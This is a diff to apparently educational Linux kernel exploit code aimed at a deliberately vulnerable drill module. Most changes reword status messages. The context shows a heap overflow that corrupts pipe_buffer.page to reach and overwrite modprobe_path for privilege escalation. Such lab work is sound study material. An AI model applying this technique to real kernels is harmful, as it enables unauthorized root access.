@@ -92,8 +92,7 @@ int increase_fd_limit(void)
 		return EXIT_FAILURE;
 	}
 
-	printf("[+] set maximum file descriptors limit: %ld\n", rlim.rlim_cur);
-
+	printf("[+] increased max file descriptor number to %ld\n", rlim.rlim_cur);
 	return EXIT_SUCCESS;
 }
 
@@ -369,13 +368,14 @@ int main(void)
 	}
 	printf("[+] allocated pipe_buffer objects and a drill_item_t object among them\n");
 
-	printf("[*] trying to corrupt a pipe_buffer near the drill_item_t object...\n");
 	/*
 	 * Overwrite pipe_buffer.page:
 	 *  - the page field in pipe_buffer is at the offset 0;
 	 *  - DRILL_ACT_SAVE_VAL with 80 as 2nd argument starts at the offset 96,
 	 *    which is exactly at the offset 0 of the next object near drill_item_t.
 	 */
+	printf("[*] try to overwrite pipe_buffer.page after drill_item_t with 0x%lx\n",
+			MODPROBE_PATH_PAGE_ADDR);
 	snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
 	ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
 	if (ret == EXIT_FAILURE)
@@ -423,7 +423,7 @@ int main(void)
 		goto end;
 	}
 
-	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
+	printf("[+] overwritten modprobe_path: %s\n", modprobe_path);
 	trigger_modprobe_sock();
 	result = EXIT_SUCCESS;
 
